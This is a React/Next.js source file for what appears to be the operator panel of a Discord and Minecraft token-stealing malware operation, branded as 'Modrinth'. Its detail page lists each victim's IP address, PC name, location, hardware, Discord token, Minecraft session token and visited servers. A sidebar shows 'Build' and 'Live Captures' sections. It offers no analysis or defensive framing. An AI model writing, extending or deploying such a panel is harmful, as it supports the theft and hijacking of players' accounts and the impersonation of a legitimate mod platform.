'use client';

import { useEffect, useState } from 'react';
import { useRouter, useParams } from 'next/navigation';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function GrabSection({ title, icon, children }) {
  return (
    <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: 20 }}>
      <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14, display: 'flex', alignItems: 'center', gap: 6 }}>
        <span>{icon}</span> {title}
      </div>
      {children}
    </div>
  );
}

function InfoRow({ label, value, full }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '7px 0', borderBottom: `1px solid ${colors.border}`, fontSize: 13 }}>
      <span style={{ color: colors.textDim, flexShrink: 0 }}>{label}</span>
      <span style={{ color: colors.text, textAlign: 'right', maxWidth: full ? '65%' : '55%', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', marginLeft: 12 }}>{value || '—'}</span>
    </div>
  );
}

export default function GrabDetailPage() {
  const router = useRouter();
  const params = useParams();
  const [grab, setGrab] = useState(null);
  const [loading, setLoading] = useState(true);
  const [deleting, setDeleting] = useState(false);

  useEffect(() => {
    fetch(`/api/grabs/${params.id}`)
      .then(r => r.json())
      .then(d => { setGrab(d.grab || d); setLoading(false); })
      .catch(() => setLoading(false));
  }, [params.id]);

  const handleDelete = async () => {
    setDeleting(true);
    await fetch(`/api/grabs/${params.id}`, { method: 'DELETE' });
    router.push('/dashboard/grabs');
  };

  const mask = (val) => {
    if (!val || val === 'Unknown' || val === 'N/A' || val === '') return '—';
    if (val.length > 16) return val.substring(0, 8) + '••••' + val.substring(val.length - 4);
    return val;
  };

  const formatDate = (t) => {
    if (!t) return '—';
    return new Date(t).toLocaleString();
  };

  if (loading) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '28px 36px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!grab) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '28px 36px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Grab not found.</div>
      </div>
    );
  }

  const servers = grab.servers ? grab.servers.split(',').filter(Boolean) : [];
  const osShort = grab.os?.includes('Windows') ? 'Windows' : grab.os?.includes('Mac') ? 'macOS' : grab.os?.includes('Linux') ? 'Linux' : grab.os || 'Unknown';

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" active onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
          <div onClick={() => router.push('/dashboard/grabs')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13, display: 'flex', alignItems: 'center', gap: 4, transition: 'color 0.15s' }} onMouseEnter={e => e.target.style.color = colors.text} onMouseLeave={e => e.target.style.color = colors.textDim}>← Back</div>
          <div onClick={handleDelete} style={{ cursor: 'pointer', color: '#ef4444', fontSize: 13, transition: 'opacity 0.15s', opacity: deleting ? 0.5 : 1 }} onMouseEnter={e => e.target.style.opacity = 0.8} onMouseLeave={e => e.target.style.opacity = 1}>🗑 Delete</div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 28 }}>
          <div style={{ width: 56, height: 56, borderRadius: 12, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden', border: `1px solid ${colors.border}` }}>
            <img src={`https://mc-heads.net/avatar/${grab.minecraft_username}/56`} alt="" style={{ width: 56, height: 56 }} onError={e => { e.target.style.display = 'none'; }} />
          </div>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{ fontSize: 22, fontWeight: 700, color: colors.text }}>{grab.minecraft_username}</span>
              <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 11, padding: '3px 10px', borderRadius: 5, fontWeight: 600 }}>🖥 {osShort}</span>
            </div>
            <div style={{ fontSize: 13, color: colors.textDim, marginTop: 3 }}>{formatDate(grab.created_at)}</div>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
          <GrabSection title="Environment" icon="💻">
            <InfoRow label="IP Address" value={grab.ip_address} />
            <InfoRow label="PC Name" value={grab.pc_name} />
            <InfoRow label="Operating System" value={grab.os} />
            <InfoRow label="OS Version" value={grab.os_version} />
            <InfoRow label="Country" value={grab.country} />
            <InfoRow label="Timezone" value={grab.timezone} />
            <InfoRow label="Language" value={grab.language} />
          </GrabSection>
          <GrabSection title="Discord Info" icon="💬">
            <InfoRow label="Discord Username" value={grab.discord_username} />
            <InfoRow label="Discord Token" value={mask(grab.discord_token)} full />
          </GrabSection>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
          <GrabSection title="Minecraft Session" icon="🎮">
            <InfoRow label="Session Token" value={mask(grab.session_id)} full />
            <InfoRow label="Session Start" value={grab.session_start ? formatDate(grab.session_start) : '—'} />
            <InfoRow label="Client Version" value={grab.client_version} />
            <InfoRow label="Java Version" value={grab.java_version} />
          </GrabSection>
          <GrabSection title="System Info" icon="⚙️">
            <InfoRow label="CPU" value={grab.cpu} />
            <InfoRow label="RAM" value={grab.ram} />
            <InfoRow label="GPU" value={grab.gpu} />
            <InfoRow label="Screen" value={grab.screen_resolution} />
            <InfoRow label="Disk" value={grab.disk_space} />
            <InfoRow label="Desktop" value={grab.desktop_env} />
          </GrabSection>
        </div>

        {servers.length > 0 && (
          <GrabSection title={`Servers (${servers.length})`} icon="🌐">
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, padding: '4px 0' }}>
              {servers.map((s, i) => (
                <div key={i} style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', fontSize: 13, color: colors.text, display: 'flex', alignItems: 'center', gap: 6 }}>
                  🌐 {s.trim()}
                </div>
              ))}
            </div>
          </GrabSection>
        )}
      </div>
    </div>
  );
}
